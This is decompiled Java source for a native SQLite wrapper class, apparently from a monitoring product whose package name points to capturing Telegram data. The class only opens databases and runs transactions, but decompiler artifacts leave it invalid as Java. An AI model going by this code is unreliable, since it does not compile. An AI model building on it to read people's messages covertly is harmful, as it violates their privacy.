package com.vvt.capture.telegram.internal.SQLite;

import android.os.SystemClock;
import com.vvt.ak.a;
import java.io.File;

public class SQLiteDatabaseNative
{
  private static final boolean LOGV = a.a;
  private static final String TAG = SQLiteDatabaseNative.class.getSimpleName();
  private boolean inTransaction = false;
  private boolean isOpen = false;
  private final int sqliteHandle;
  private StackTraceElement[] temp;
  
  public SQLiteDatabaseNative(String paramString1, String paramString2)
  {
    File localFile = new java/io/File;
    localFile.<init>(paramString2);
    boolean bool = localFile.isDirectory();
    if (!bool) {
      localFile.mkdirs();
    }
    i = opendb(paramString1, paramString2);
    this.sqliteHandle = i;
    this.isOpen = true;
  }
  
  public void beginTransaction()
  {
    boolean bool = this.inTransaction;
    if (bool)
    {
      SQLiteException localSQLiteException = new com/vvt/capture/telegram/internal/SQLite/SQLiteException;
      localSQLiteException.<init>("database already in transaction");
      throw localSQLiteException;
    }
    this.inTransaction = true;
    int i = this.sqliteHandle;
    beginTransaction(i);
  }
  
  native void beginTransaction(int paramInt);
  
  void checkOpened()
  {
    boolean bool = this.isOpen;
    if (!bool)
    {
      SQLiteException localSQLiteException = new com/vvt/capture/telegram/internal/SQLite/SQLiteException;
      localSQLiteException.<init>("Database closed");
      throw localSQLiteException;
    }
  }
  
  public void close()
  {
    boolean bool = this.isOpen;
    if (bool) {}
    try
    {
      bool = LOGV;
      if (bool) {}
      commitTransaction();
      i = this.sqliteHandle;
      closedb(i);
      long l = 5000L;
      SystemClock.sleep(l);
    }
    catch (SQLiteException localSQLiteException)
    {
      int i;
      for (;;) {}
    }
    i = 0;
    this.isOpen = false;
  }
  
  native void closedb(int paramInt);
  
  public void commitTransaction()
  {
    boolean bool = this.inTransaction;
    if (!bool) {}
    for (;;)
    {
      return;
      this.inTransaction = false;
      int i = this.sqliteHandle;
      commitTransaction(i);
    }
  }
  
  native void commitTransaction(int paramInt);
  
  public SQLitePreparedStatement executeFast(String paramString)
  {
    SQLitePreparedStatement localSQLitePreparedStatement = new com/vvt/capture/telegram/internal/SQLite/SQLitePreparedStatement;
    localSQLitePreparedStatement.<init>(this, paramString, true);
    return localSQLitePreparedStatement;
  }
  
  public void finalize()
  {
    super.finalize();
    close();
  }
  
  public int getSQLiteHandle()
  {
    return this.sqliteHandle;
  }
  
  native int opendb(String paramString1, String paramString2);
  
  public SQLiteCursorNative queryFinalized(String paramString, Object... paramVarArgs)
  {
    checkOpened();
    SQLitePreparedStatement localSQLitePreparedStatement = new com/vvt/capture/telegram/internal/SQLite/SQLitePreparedStatement;
    localSQLitePreparedStatement.<init>(this, paramString, true);
    return localSQLitePreparedStatement.query(paramVarArgs);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/SQLite/SQLiteDatabaseNative.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */